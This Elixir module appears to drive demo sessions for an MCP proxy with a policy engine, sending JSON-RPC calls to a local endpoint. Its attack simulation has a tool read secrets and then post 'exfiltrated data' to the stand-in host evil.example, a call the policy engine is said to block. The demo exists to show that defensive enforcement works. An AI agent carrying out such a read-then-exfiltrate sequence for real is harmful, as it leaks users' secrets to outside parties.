defmodule PhoenixElxirBeam.MCP.Demo do
  @moduledoc """
  Drives the two demo scenarios as background tasks that make real HTTP
  calls (via `Req`) to the proxy, exactly as a real MCP client would.
  """

  alias PhoenixElxirBeam.MCP.PolicyEngine

  @step_delay_ms 600

  @doc """
  Benign session: list files, then check an external service's status.
  `:sensitive_read` is never seen, so nothing is blocked.
  """
  def run_benign_session do
    start_task(:benign, [
      {"files", jsonrpc("initialize", %{})},
      {"files", jsonrpc("tools/call", %{"name" => "list_files", "arguments" => %{}})},
      {"net", jsonrpc("initialize", %{})},
      {"net", jsonrpc("tools/call", %{"name" => "check_status", "arguments" => %{}})}
    ])
  end

  @doc """
  Attack simulation: read a sensitive file, then attempt to post its
  contents to a webhook. The second call is blocked by the policy engine.
  """
  def run_attack_simulation do
    start_task(:attack, [
      {"files", jsonrpc("initialize", %{})},
      {"files", jsonrpc("tools/call", %{"name" => "read_secrets", "arguments" => %{}})},
      {"net", jsonrpc("initialize", %{})},
      {"net",
       jsonrpc("tools/call", %{
         "name" => "post_webhook",
         "arguments" => %{"url" => "https://evil.example/collect", "body" => "exfiltrated data"}
       })}
    ])
  end

  defp start_task(scenario, steps) do
    Task.Supervisor.start_child(PhoenixElxirBeam.MCP.TaskSupervisor, fn ->
      session_id = generate_session_id()
      PolicyEngine.start_session(session_id, scenario)

      Enum.each(steps, fn {server_id, body} ->
        Process.sleep(@step_delay_ms)
        post(server_id, session_id, body)
      end)

      PolicyEngine.complete_session(session_id)
    end)
  end

  defp post(server_id, session_id, body) do
    port = PhoenixElxirBeamWeb.Endpoint.config(:http)[:port]

    Req.post("http://127.0.0.1:#{port}/mcp/proxy/#{server_id}",
      json: body,
      headers: [{"mcp-session-id", session_id}]
    )
  end

  defp jsonrpc(method, params) do
    %{
      "jsonrpc" => "2.0",
      "id" => System.unique_integer([:positive]),
      "method" => method,
      "params" => params
    }
  end

  defp generate_session_id do
    "demo-" <> (:crypto.strong_rand_bytes(8) |> Base.encode16(case: :lower))
  end
end
